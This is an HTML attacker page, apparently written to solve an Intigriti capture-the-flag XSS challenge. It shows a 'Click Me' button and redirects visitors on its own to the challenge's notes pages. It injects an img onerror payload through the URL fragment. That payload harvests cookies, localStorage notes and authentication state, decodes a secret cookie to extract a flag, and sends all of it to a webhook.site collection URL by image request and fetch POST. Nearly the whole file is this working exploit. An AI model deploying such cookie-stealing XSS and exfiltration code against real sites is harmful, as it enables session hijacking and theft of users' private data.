<!DOCTYPE html>
<html>
<head>
    <title>Click Me</title>
    <style>
        body {
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }
        .button {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px 40px;
            background-color: #4CAF50;
            color: white;
            font-size: 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <!-- This auto-redirects to the challenge site -->
    <script>
        // Automatically redirect to challenge site with XSS payload in fragment
        window.onload = function() {
            // Create the button first (in case redirect is blocked)
            const button = document.createElement('button');
            button.className = 'button';
            button.textContent = 'Click Me!';
            button.onclick = function() {
                // XSS payload that will execute on challenge site to extract and leak data
                const xssPayload = `<img src=x onerror="
                    (function(){
                        // Gather data to exfiltrate
                        const c = document.cookie;
                        const notes = localStorage.getItem('notes') || '';
                        const auth = localStorage.getItem('isAuthenticated') || '';
                        
                        // Secret cookie handling (contains flag)
                        let s = '';
                        if(c.includes('secret=')){
                            s = c.split('secret=')[1].split(';')[0];
                        }
                        
                        // Try to decode secret (username:flag format)
                        let d = '';
                        try { d = atob(s); } catch(e){}
                        
                        // Extract flag from decoded secret
                        let f = '';
                        if(d && d.includes(':')) {
                            f = d.split(':')[1];
                        }
                        
                        // Send data using image (most reliable)
                        const img = new Image();
                        img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?f='+
                            encodeURIComponent(f)+
                            '&s='+encodeURIComponent(s)+
                            '&d='+encodeURIComponent(d)+
                            '&auth='+encodeURIComponent(auth)+
                            '&n='+encodeURIComponent(notes.substring(0,100))+
                            '&t='+Date.now();
                        document.body.appendChild(img);
                        
                        // Also send via fetch
                        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
                            method: 'POST',
                            mode: 'no-cors',
                            body: JSON.stringify({
                                flag: f,
                                cookies: c,
                                secret: s,
                                decoded: d,
                                auth: auth,
                                notes: notes,
                                url: location.href
                            })
                        });
                    })();
                ">`;
                
                // Redirect to challenge site with XSS payload
                window.location.href = 'https://challenge-0325.intigriti.io/notes#' + encodeURIComponent(xssPayload);
            };
            
            // Add button to page
            document.body.appendChild(button);
            
            // Automatically redirect to challenge site after 1 second
            setTimeout(function() {
                // Same payload as button click, just executed automatically
                const xssPayload = `<img src=x onerror="
                    (function(){
                        // Gather data to exfiltrate
                        const c = document.cookie;
                        const notes = localStorage.getItem('notes') || '';
                        const auth = localStorage.getItem('isAuthenticated') || '';
                        
                        // Secret cookie handling
                        let s = '';
                        if(c.includes('secret=')){
                            s = c.split('secret=')[1].split(';')[0];
                        }
                        
                        // Try to decode secret
                        let d = '';
                        try { d = atob(s); } catch(e){}
                        
                        // Extract flag from decoded secret
                        let f = '';
                        if(d && d.includes(':')) {
                            f = d.split(':')[1];
                        }
                        
                        // Send data using image (most reliable)
                        const img = new Image();
                        img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?f='+
                            encodeURIComponent(f)+
                            '&s='+encodeURIComponent(s)+
                            '&d='+encodeURIComponent(d)+
                            '&auth='+encodeURIComponent(auth)+
                            '&n='+encodeURIComponent(notes.substring(0,100))+
                            '&t='+Date.now();
                        document.body.appendChild(img);
                        
                        // Schedule another attempt to exfiltrate
                        setTimeout(function(){
                            const img2 = new Image();
                            img2.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?auto=1&f='+
                                encodeURIComponent(f)+'&t='+Date.now();
                            document.body.appendChild(img2);
                        }, 5000);
                    })();
                ">`;
                
                // Redirect
                window.location.href = 'https://challenge-0325.intigriti.io/protected-note#' + encodeURIComponent(xssPayload);
            }, 1000);
        };
    </script>
</body>
</html>
